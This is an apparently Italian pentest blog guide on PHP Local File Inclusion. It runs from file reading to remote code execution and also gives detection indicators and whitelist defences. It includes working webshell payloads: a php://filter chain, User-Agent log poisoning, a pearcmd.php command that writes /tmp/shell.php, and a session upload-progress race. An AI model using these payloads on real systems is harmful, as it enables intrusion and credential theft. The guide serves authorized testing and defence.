---
title: 'Local File Inclusion (LFI): Attacchi, Payload, RCE & Bypass'
slug: lfi
description: 'Scopri come funziona la vulnerabilità LFI: lettura dei file, PHP wrapper, filter chain e log poisoning, con tecniche di exploitation e contromisure nel pentest.'
image: /local-file-inclusion-lfi-php-rce.webp
draft: false
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - Local File Inclusion
  - LFI Vulnerability
  - PHP Wrappers
  - PHP Filter Chain
  - Remote Code Execution
---

# LFI (Local File Inclusion) in PHP: dalla lettura di file alla RCE

Una Local File Inclusion esiste quando un'applicazione passa un input controllato dall'utente a una funzione che **include** un file — in PHP `include()`, `include_once()`, `require()`, `require_once()` — invece di limitarsi a leggerlo. La differenza con il [Path Traversal](/articoli/path-traversal/) è questa: il Path Traversal è la tecnica che manipola il percorso per uscire dalla cartella prevista; la LFI è la classe di vulnerabilità in cui quel percorso finisce dentro una funzione di inclusione. Si usano spesso insieme (il traversal per raggiungere il file, la LFI per includerlo), ma non sono la stessa cosa, e una LFI non porta automaticamente a esecuzione di codice.

> **Risposta rapida.** Una LFI permette quasi sempre di **leggere** file del server (codice sorgente, configurazioni, credenziali). Diventa **RCE** solo quando esiste un modo per far sì che il contenuto incluso sia, o diventi, codice PHP valido — tramite un wrapper (`php://filter`, `php://input`, `data://`), un file che l'attaccante controlla (un log, una sessione, un file caricato), o una tecnica più recente come la **PHP filter chain**. Quale strada funziona dipende dalla versione di PHP, dalla configurazione (`allow_url_include`, `allow_url_fopen`, estensioni caricate) e da cosa è scrivibile o raggiungibile sul server. Non esiste una tecnica che funzioni sempre e su ogni target.

Questa guida fa parte del satellite della [guida pillar File & Path Attacks](/articoli/file-path-attacks-guida-completa/) e va letta insieme a [RFI](/articoli/rfi/) (la stessa idea, ma il file incluso sta su un host remoto) e [Arbitrary File Read](/articoli/arbitrary-file-read/) (quando l'obiettivo è solo leggere, senza puntare alla RCE).

## Come ho verificato questa guida

Ogni comando di questa pagina, salvo dove indicato come "storico" o "non verificato", è stato eseguito in un laboratorio locale: **PHP 8.3.6** (CLI e mod\_php su Apache), pagine PHP scritte apposta per riprodurre pattern di LFI reali (`include($_GET['file'])`, un prefisso/suffisso tipo `include("lang/".$_GET['l'].".php")`). Dove un comportamento dipende dalla versione di PHP, lo dico esplicitamente — perché è proprio uno dei punti dove le guide più vecchie (compresa la nostra versione precedente di questo articolo) sbagliano.

Una nota aggiornata al 13 ottobre 2026: PHP **8.6** introduce un limite al numero di filtri concatenabili in `php://filter` (RFC [limit-maximum-number-of-filter-chains](https://wiki.php.net/rfc/limit-maximum-number-of-filter-chains), approvata), che rende la tecnica della filter chain (vedi più sotto) non più universale come lo è stata dal 2023 al 2026. Al momento in cui scrivo, PHP 8.6 è ancora in fase RC, non una release di produzione: la stragrande maggioranza dei server in giro gira su versioni precedenti, dove il limite non esiste.

## Cos'è una LFI e cosa significa davvero "eseguire" un file

Quando PHP incontra `include($file)`, apre `$file` e **interpreta** il suo contenuto come script PHP: tutto ciò che sta fuori dai tag `<?php ... ?>` viene stampato come testo, tutto ciò che sta dentro viene eseguito. Questo è il motivo per cui includere `config.php` normalmente non "restituisce" il codice sorgente: PHP lo esegue, non te lo mostra. Se il file incluso contiene solo variabili (niente `echo`), l'output è vuoto — l'ho verificato: incluso un file con tre assegnazioni e nessun `echo`, la risposta HTTP è 0 byte.

Da qui nascono due esigenze opposte:

* **Per leggere il codice sorgente** serve un modo per impedire l'esecuzione e ottenere il contenuto grezzo. È il ruolo di `php://filter` (sotto).
* **Per ottenere RCE** serve che il contenuto incluso sia codice PHP valido quando PHP lo interpreta. Alcuni wrapper lo permettono direttamente; altrimenti serve che l'attaccante riesca a scrivere PHP in un file che poi include (log, sessione, upload).

## Discovery: trovare il parametro e confermarlo

Un parametro è sospetto quando il suo valore sembra un nome di file, un template o una lingua (`page`, `file`, `template`, `lang`, `view`, `module`, `include`). Il fuzzing con [ffuf](/articoli/ffuf/) resta il modo più veloce per testare molti parametri e molti payload insieme:

```bash
# find which parameter is vulnerable, trying several names at once
ffuf -u "https://target.tld/index.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mr "root:x:"

# once the parameter is known, fuzz payload variants (encoding, depth, wrappers)
ffuf -u "https://target.tld/index.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mr "root:x:"
```

Due avvertenze sui falsi positivi, verificate nel lab:

* Un match su `root:x:` conferma che **quel payload specifico** ha funzionato, non che ogni traversal funzioni. Testando `../../../../etc/passwd` contro un parametro con prefisso/suffisso fissi (`include("lang/" . $_GET['l'] . ".php")`) ottengo un errore (`Failed to open stream`), perché il file risultante è `lang/../../../../etc/passwd.php`, che non esiste. La stessa identica stringa funziona su un parametro senza prefisso/suffisso.
* Un file letto con successo **non significa RCE**. Sono passaggi distinti, con prerequisiti distinti: li vediamo separatamente.

## PHP wrapper: cosa fa ciascuno e a quali condizioni

I wrapper sono protocolli che PHP riconosce al posto di un percorso di file. Non tutti richiedono le stesse condizioni, e confonderli è l'errore più comune nelle guide in giro.

| Wrapper            | Cosa fa                                                                                                                                     | Richiede                                                                                            | Verificato nel lab                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| `php://filter`     | Applica un filtro al contenuto di un file locale prima di restituirlo — tipicamente `convert.base64-encode` per leggere PHP senza eseguirlo | Nessuna configurazione speciale: funziona anche con `allow_url_include=Off`                         | ✅ Letto `config.php` in chiaro via base64                       |
| `php://input`      | Il corpo della richiesta HTTP diventa il contenuto incluso                                                                                  | `allow_url_include=On` (default `Off` da PHP 5.2+)                                                  | ✅ RCE con `On`; fallisce con `Off`                              |
| `data://`          | Il contenuto è nell'URL stesso (plain o base64)                                                                                             | `allow_url_include=On`                                                                              | ✅ RCE con `On`; con `Off` PHP rifiuta esplicitamente il wrapper |
| `expect://`        | Esegue un comando di shell direttamente                                                                                                     | L'estensione PECL `expect`, che **non è installata di default** su nessuna distribuzione PHP comune | ❌ "Unable to find the wrapper" nel lab, installazione pulita    |
| `zip://`           | Legge un file dentro un archivio ZIP (anche se l'archivio ha un'altra estensione, es. `.jpg`)                                               | Un modo per caricare l'archivio sul server (upload)                                                 | ✅ Eseguito PHP dentro uno zip rinominato `.jpg`                 |
| `phar://`          | Come sopra, usando un archivio Phar                                                                                                         | Un modo per caricare il Phar sul server                                                             | ✅ Eseguito PHP dentro un Phar rinominato `.png`                 |
| `compress.zlib://` | Legge un file, anche compresso al volo                                                                                                      | Nessuna                                                                                             | ✅ Lettura semplice confermata                                   |

Punto pratico sul case: i nomi dei wrapper **non sono case-sensitive** per PHP (`PhP://FiLtEr` funziona quanto `php://filter`), ma questo non è un bypass di sicurezza — è solo come funziona il parser degli stream wrapper. Se un WAF blocca la stringa `php://` in modo letterale, il case mixing può eluderlo; se il WAF normalizza prima di confrontare, no.

### `php://filter`: leggere il sorgente senza eseguirlo

```bash
# Request:
GET /page.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
```

Nel lab, la risposta è la versione base64 del file:

```
PD9waHAKJGRiX2hvc3QgPSAnMTAuMC4xLjUwJzsKJGRiX3VzZXIgPSAnYWRtaW4nOwokZGJfcGFzcyA9ICdTdXBlclNlY3JldDEyMyEnOwo/Pgo=
```

decodificata:

```php
<?php
$db_host = '10.0.1.50';
$db_user = 'admin';
$db_pass = 'SuperSecret123!';
?>
```

Varianti utili quando `base64-encode` è bloccato da un WAF: `convert.iconv.UTF-8.UTF-7` (converte il charset, leggibile con un decoder ad hoc), `string.rot13`, `zlib.deflate` (va poi decompresso). Sono alternative legittime, non bypass magici: cambiano solo la codifica, non la logica.

## La PHP filter chain: RCE dal solo file read, con condizioni precise

Nel 2023-2024 [Synacktiv](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) ha pubblicato una tecnica che concatena **decine di filtri `convert.iconv`** per trasformare, byte per byte, il contenuto di un file qualsiasi (anche uno vuoto, come `php://temp`) nel codice PHP che l'attaccante vuole eseguire. Il tool di riferimento è [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator).

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>' > chain.txt
```

Il file generato è **una sola riga**, lunga diverse migliaia di caratteri — nel mio test, quasi 5.800. Usata al posto del parametro vulnerabile:

```bash
CH=$(cat chain.txt)
curl -s -G "https://target.tld/page.php" --data-urlencode "file=$CH" --data-urlencode "c=id"
# output ottenuto nel lab: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Funziona davvero, l'ho verificato: comando eseguito, nessun upload, nessun log da trovare.

**Ma non è universale**, ed è qui che le versioni vecchie di questo articolo (e molte guide online) sbagliano:

* **Serve una LFI funzionante** su una primitiva che accetti uno stream wrapper come percorso — non tutte le LFI lo permettono (dipende da cosa fa l'applicazione col valore prima di passarlo a `include()`).
* **Dipende dalla versione di PHP.** Dalla 8.6 in poi (RFC approvata, PHP 8.6 in RC al momento di questa verifica) ogni `php://filter` è limitato a **16 filtri** per default; oltre quel numero PHP emette un avviso di deprecazione nella 8.6 e, dalla 8.7, un errore che blocca l'apertura dello stream. Le chain generate da questo tool ne usano centinaia: su PHP 8.6+ con il limite attivo, la tecnica nella sua forma attuale non funziona più senza modifiche. Su tutte le versioni precedenti (quelle in uso sulla stragrande maggioranza dei server oggi) non c'è questo limite.
* **La chain è lunghissima**: può superare limiti di lunghezza URL del server o del reverse proxy. Se il parametro è in GET e fallisce per lunghezza, prova POST o un body JSON se l'applicazione lo accetta.

### Variante: leggere un file alla cieca con lo stesso principio

Una LFI **cieca** (nessun contenuto riflesso in risposta) sembra inutile per esfiltrare dati — ma Synacktiv ha mostrato che si può trasformare in un **oracolo**: alcuni filtri falliscono (producono un warning PHP, quindi un errore HTTP diverso) a seconda del contenuto del file, byte per byte. Interrogando ripetutamente il server con filtri diversi e osservando solo *se* fallisce o no, si ricostruisce il contenuto senza mai vederlo direttamente. Il tool [php\_filter\_chains\_oracle\_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) automatizza il processo:

```bash
python3 filters_chain_oracle_exploit.py --target https://target.tld/blind.php --file /etc/hostname --parameter file
```

Nel mio lab, contro una pagina che non riflette nulla in risposta (`@include($_POST['file']);` con `display_errors` disattivato), il tool ha ricostruito correttamente il contenuto di un file di test in pochi secondi. È più lento di una LFI "normale" perché fa molte richieste per ogni byte, ma è l'unica via quando l'output non è mai visibile.

## Log poisoning: scrivere PHP in un file che poi includi

Quando i wrapper non sono percorribili (nessun `allow_url_include`, PHP 8.6+ con limite sulla chain, nessun modo di caricare un file), l'alternativa classica è scrivere codice PHP in un posto che l'applicazione logga per conto tuo, e poi includere quel file.

```bash
# Step 1: find a log reachable through the same LFI
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/nginx/access.log

# Step 2: get your payload logged — simplest vector is the User-Agent
curl -s "https://target.tld/" -A '<?php system($_GET["c"]); ?>'

# Step 3: include the log, passing the command in the same request
curl -s "https://target.tld/page.php?file=../../../../var/log/apache2/access.log&c=id"
```

Un dettaglio che ho trovato testando (e che non vedo citato quasi da nessuna parte): **se il payload contiene doppi apici**, Apache li salva nel log già preceduti da backslash di escape, e PHP incontra un errore di sintassi provando a interpretarli — il log poisoning fallisce silenziosamente. Con apici singoli (`system($_GET['c'])` invece di `system($_GET["c"])`) il problema non si presenta: nel lab, con apici singoli, l'esecuzione è andata a buon fine al primo colpo (`uid=33(www-data)`).

Prerequisiti reali, spesso dati per scontati: **il processo PHP deve poter leggere il file di log**. Su molte distribuzioni Linux i log di Apache/Nginx sono di proprietà di `root:adm` con permessi `640` — in quel caso l'inclusione fallisce con "Permission denied", a prescindere da quanto sia corretto il resto della tecnica. L'ho riprodotto nel lab impostando quei permessi: stessa richiesta, stesso payload, risultato "Permission denied" invece di RCE. Verificalo prima di dare per morta o per funzionante la tecnica.

## Session poisoning: la via affidabile è una race condition, non una coincidenza applicativa

La versione "scolastica" del session poisoning (trovare una pagina che salva un input utente in `$_SESSION` e sperare che sia PHP valido) è poco realistica: richiede un comportamento applicativo specifico che raramente esiste così com'è. La tecnica che uso quando serve davvero è diversa e sfrutta una funzionalità di PHP stesso: **`PHP_SESSION_UPLOAD_PROGRESS`**.

Quando `session.upload_progress.enabled` è attivo (è il default dalla 5.4 in poi) e una richiesta multipart contiene un campo chiamato `PHP_SESSION_UPLOAD_PROGRESS`, PHP scrive **quel valore, non filtrato**, nel file di sessione dell'utente, per tutta la durata dell'upload — e lo ripulisce subito dopo che l'upload finisce. Se in quella finestra (anche solo una frazione di secondo, se il file caricato è grande) un'altra richiesta include il file di sessione, PHP esegue quello che hai messo in `PHP_SESSION_UPLOAD_PROGRESS`.

Prerequisiti: una LFI che possa includere `session.save_path` (di default `/var/lib/php/sessions/sess_<ID>` su Debian/Ubuntu), e la possibilità di impostare tu stesso l'ID di sessione (`Cookie: PHPSESSID=qualcosa`) — non serve rubarlo, lo scegli tu. È una corsa (race condition): servono più richieste di upload e più richieste di inclusione in parallelo per aumentare le probabilità di centrare la finestra.

Nel mio lab, con 4 thread che caricano un file da qualche megabyte e 8 thread che includono in loop il file di sessione in parallelo, la race è stata vinta in **0,2 secondi**. Non è una tecnica di laboratorio teorica: è affidabile quanto basta per essere la prima scelta quando log poisoning non è percorribile.

## `pearcmd.php`: RCE specifica delle immagini Docker ufficiali di PHP

Una tecnica meno nota, diffusa da [phith0n](https://github.com/phith0n) e ripresa in HackTricks, sfrutta il fatto che molte immagini Docker ufficiali `php:*-apache` e `php:*-fpm` includono **PEAR** per default, e con esso `/usr/share/php/pearcmd.php` — uno script pensato per essere lanciato da riga di comando, ma che PHP eseguirà comunque se lo includi via HTTP, interpretando la query string come se fossero argomenti CLI:

```bash
curl -s -g "https://target.tld/page.php?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=system(\$_GET['c'])?>+/tmp/shell.php"
curl -s "https://target.tld/page.php?file=/tmp/shell.php&c=id"
```

Ho verificato che **funziona solo se `register_argc_argv` è `On`**: con il valore di default di `php.ini-production` (`Off`), `pearcmd.php` fallisce con un errore PHP (`Undefined array key "argv"`) e non crea nulla. Prima di investire tempo su questa tecnica, verifica che l'errore non compaia — se compare, il percorso è chiuso su quel target. Vale comunque la pena saperla, perché molte immagini Docker preconfezionate (comprese alcune distribuzioni "quick start" trovate online) attivano `register_argc_argv` per compatibilità con script legacy.

## `/proc/self/environ`: tecnica storica, oggi spesso bloccata

La variante classica scrive PHP nello User-Agent e include `/proc/self/environ` (che contiene le variabili d'ambiente del processo, incluso `HTTP_USER_AGENT`). L'ho testata nel mio lab (Apache con mod\_php su un container moderno) e il risultato è "Permission denied" — non per un problema di permessi sul file in sé, ma per le restrizioni che i kernel Linux moderni e molte configurazioni container applicano all'accesso a `/proc/<pid>/environ` anche per lo stesso utente proprietario del processo. Funziona ancora su alcune configurazioni CGI o mod\_php datate, ma non è più un vettore su cui contare come default: trattala come tecnica da provare, non da promettere.

## Bypass di filtri: cosa è ancora vivo, cosa è morto

| Tecnica                                               | Stato verificato                                                                                                                                                                             |
| ----------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Null byte (`%00`) a fine stringa                      | **Morta.** PHP tronca la stringa al null byte internamente dalla 5.3.4 in poi; su PHP 8.3 l'ho testata e non ha alcun effetto, il warning mostra la stringa con il suffisso ancora attaccato |
| Path truncation (percorso oltre il limite di sistema) | **Storica**, legata a limiti di PHP \< 5.3 ormai fuori supporto da anni; non l'ho trovata applicabile su versioni correnti                                                                   |
| Doppio URL encoding (`%252e%252e%252f`)               | Utile solo se **un livello** di decodifica avviene prima del controllo e un altro dopo (tipico di WAF/proxy davanti all'app) — non è una proprietà di PHP, dipende dallo stack davanti       |
| UTF-8 overlong (`%c0%af`)                             | Dipende da come il livello che normalizza il path (web server, proxy, WAF) gestisce sequenze non canoniche; non generalizzabile                                                              |
| Strip non ricorsivo di `../` (`....//`)               | Funziona **solo** se il codice applicativo rimuove `../` con una singola `str_replace` non ripetuta — l'ho riprodotto: con un filtro così scritto, `....//` lascia `../` dopo la rimozione   |
| JSON body invece di query string/form                 | Vale come evasione quando il WAF ispeziona solo query string o form-urlencoded e non il body JSON — non è garanzia universale, molti WAF moderni ispezionano anche JSON                      |

Il punto comune: **nessuno di questi è un bypass della LFI in sé**. Sono bypass di un filtro applicativo o di un livello di sicurezza aggiuntivo specifico, e vanno verificati uno per uno contro l'implementazione reale che hai davanti.

## Una nota su CVE-2024-2961 (glibc `iconv`)

Nel 2024 [Charles Fol](https://www.wiz.io/vulnerability-database/cve/cve-2024-2961) ha pubblicato CVE-2024-2961, un buffer overflow nella funzione `iconv()` della glibc innescabile tramite la conversione di charset `ISO-2022-CN-EXT`, usata anche dai filtri `convert.iconv` di PHP. Su sistemi con una glibc vulnerabile, questo apre una strada di RCE più diretta rispetto alla filter chain "costruttiva", ma dipende dalla versione esatta della libc del sistema operativo sottostante, non solo da PHP: non l'ho riprodotta nel lab (richiede una build glibc specifica) e la cito solo perché rientra nella stessa famiglia di tecniche — se stai verificando un target, controlla la versione di glibc prima di assumere che sia sfruttabile.

## Dalla LFI alla shell: la sequenza con cui lavoro davvero

Non tre playbook diversi — una sola progressione, con la decisione a ogni bivio:

1. **Conferma la LFI** con ffuf su parametro e payload, poi verifica a mano che il risultato non sia un falso positivo legato a prefisso/suffisso.
2. **Leggi il sorgente** con `php://filter/convert.base64-encode`. Cerca credenziali (`.env`, file di configurazione, `wp-config.php` e simili) prima di tentare qualunque RCE: spesso bastano queste per accedere diversamente al sistema.
3. **Prova l'RCE diretta**, in ordine di probabilità di successo: `php://input` o `data://` (richiedono `allow_url_include=On`, verificalo tentando e leggendo l'errore) → PHP filter chain (richiede PHP \< 8.6, o 8.6+ senza il limite rafforzato) → `pearcmd.php` se è un'immagine Docker ufficiale PHP (richiede `register_argc_argv=On`) → zip/phar se riesci a caricare un file.
4. **Se nessuna wrapper funziona**, log poisoning (verifica i permessi del file di log prima di escludere la tecnica) o, meglio ancora, la race condition su `PHP_SESSION_UPLOAD_PROGRESS`.
5. **Se la LFI è cieca** (nessun output visibile), valuta l'oracolo error-based per l'esfiltrazione, prima di scartare la vulnerabilità come "non sfruttabile".
6. **Da shell, cerca segreti** (`.env`, chiavi SSH, variabili d'ambiente) e valuta l'escalation verso database, servizi cloud o altri sistemi — ma questo passaggio dipende interamente da cosa trovi, non è un risultato garantito dalla sola LFI.

## Scenario illustrativo (laboratorio, non un caso reale)

Per mostrare la sequenza intera, ecco uno scenario costruito nel mio ambiente di test — **non un incarico reale**, e lo segnalo esplicitamente perché un report che confonde i due piani perde credibilità.

Applicazione PHP con `?lang=en` che include `languages/en.php`. Fuzzing con ffuf conferma il parametro. `php://filter/convert.base64-encode/resource=../config` restituisce un file con credenziali MySQL di test. Il parametro accetta anche `php://input`: con `allow_url_include=On` (impostazione volutamente lasciata nel lab per mostrare la tecnica) ottengo esecuzione di comandi con `system($_GET['c'])` nel body della richiesta POST, confermata da `uid=33(www-data)`.

Da qui in poi **non proseguo con passaggi non dimostrati**: forgiare un cookie di sessione admin richiede conoscere il framework, il formato del cookie e l'algoritmo di firma usati — non è un passaggio automatico dalla sola scoperta di una `SECRET_KEY`, e lo stesso vale per qualunque salto verso Active Directory o Domain Admin, che richiede credenziali, privilegi e condizioni specifiche del tutto indipendenti dalla LFI di partenza. Un report onesto si ferma al punto in cui l'evidenza finisce.

## Indicatori di compromissione

* Parametri URL o body contenenti `php://`, `data://`, `zip://`, `phar://`, `expect://`, o lunghe sequenze di `convert.iconv` — queste ultime, in particolare, sono una firma quasi univoca della filter chain, perché nessun uso legittimo genera stringhe di migliaia di caratteri in quel formato
* Richieste multipart con un campo `PHP_SESSION_UPLOAD_PROGRESS` seguito, a brevissima distanza, da richieste verso lo stesso endpoint con un parametro che assomiglia a un percorso di sessione
* User-Agent contenenti `<?php`, `system(`, `exec(`, `passthru(` nei log web
* Richieste verso file di log (`access.log`, `error.log`) passati come valore di un parametro
* Processi di shell (`sh`, `bash`) generati come figli del processo PHP/Apache subito dopo una richiesta con uno di questi pattern

## Difesa: cosa risolve davvero il problema

```php
// vulnerable: user input decides which file gets included
include($_GET['page']);
include($_GET['page'] . '.php');
include("templates/" . $_GET['lang'] . ".php");

// not vulnerable: user input only selects an index into a fixed, server-side list
$allowed = ['en' => 'lang/en.php', 'it' => 'lang/it.php', 'de' => 'lang/de.php'];
$lang = $_GET['lang'] ?? 'en';
include($allowed[$lang] ?? $allowed['en']);
```

L'unica difesa che chiude il problema alla radice è la **whitelist**: l'input dell'utente seleziona una chiave in un array definito lato server, mai un percorso. Tutto il resto è difesa in profondità, utile ma non sufficiente da sola:

* `allow_url_include = Off` (il default da anni) chiude `php://input` e `data://`, ma non tocca `php://filter`, `zip://` o `phar://`;
* `open_basedir` limita quali directory PHP può aprire, riducendo (non eliminando) il traversal utile;
* permessi restrittivi sui file di log (non leggibili dall'utente con cui gira PHP) chiudono il log poisoning;
* `session.upload_progress.enabled = Off` chiude la tecnica basata sulla race condition, se non serve a nient'altro nell'applicazione;
* aggiornare a PHP ≥ 8.6 (quando sarà stabile) riduce l'affidabilità della filter chain "classica", ma non elimina le altre strade.

## FAQ

**La LFI è sempre RCE?**
No. Da sola è quasi sempre un file read. Diventa RCE solo in presenza di una delle condizioni descritte sopra (wrapper disponibile, file scrivibile e includibile, filter chain compatibile con la versione di PHP).

**Qual è la differenza tra LFI e Path Traversal?**
Il Path Traversal è la manipolazione del percorso per uscire dalla cartella prevista; la LFI è l'inclusione di quel percorso in una funzione che interpreta il contenuto come codice. Una LFI spesso usa un path traversal per arrivarci, ma un path traversal puro (per esempio su un endpoint che legge e basta, senza `include()`) non è una LFI.

**`php://filter` funziona sempre?**
Funziona su qualunque versione di PHP per leggere file, indipendentemente da `allow_url_include`. Non richiede prerequisiti particolari, a differenza di `php://input` e `data://`.

**La PHP filter chain funziona su qualsiasi LFI?**
No. Serve che il parametro vulnerabile accetti uno stream wrapper come valore, e la tecnica nella sua forma attuale perde affidabilità su PHP 8.6+ per via del limite di 16 filtri introdotto dalla relativa RFC.

**Come prevengo una LFI in PHP?**
Con una whitelist lato server che mappa l'input a percorsi fissi, mai costruendo un percorso a partire da input dell'utente, nemmeno con prefisso e suffisso.

**Esiste un modo per sfruttare una LFI completamente cieca?**
Sì, con la tecnica dell'oracolo error-based: non vedi il contenuto, ma deduci byte per byte se un filtro ha prodotto un errore. È più lenta ma funziona anche senza alcun output riflesso.

## Checklist

* ☐ Parametro confermato con ffuf, falso positivo escluso (prefisso/suffisso)
* ☐ `php://filter/convert.base64-encode` tentato per leggere sorgente e configurazioni
* ☐ `allow_url_include` dedotto dal comportamento di `php://input` e `data://`
* ☐ Versione di PHP verificata prima di investire tempo sulla filter chain
* ☐ `register_argc_argv` verificato prima di tentare `pearcmd.php`
* ☐ Permessi dei file di log verificati prima di escludere o promettere il log poisoning
* ☐ Race condition su `PHP_SESSION_UPLOAD_PROGRESS` tentata se log poisoning non è percorribile
* ☐ Oracolo error-based considerato se la LFI è cieca
* ☐ Nel report: distinzione chiara tra file read dimostrato, RCE dimostrata e passaggi successivi non verificati

## Riferimenti tecnici

* [PHP Manual — `include()`](https://www.php.net/manual/en/function.include.php)
* [PHP Manual — wrapper `php://`](https://www.php.net/manual/en/wrappers.php.php)
* [PHP Manual — wrapper `data://`](https://www.php.net/manual/en/wrappers.data.php)
* [OWASP WSTG — Testing for Local File Inclusion](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion/)
* [RFC PHP — Limit maximum number of filter chains](https://wiki.php.net/rfc/limit-maximum-number-of-filter-chains)
* [Synacktiv — PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)
* [Synacktiv — php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator)

Usa queste tecniche solo su sistemi per cui hai un'autorizzazione scritta, o in laboratori come quello di questa guida.
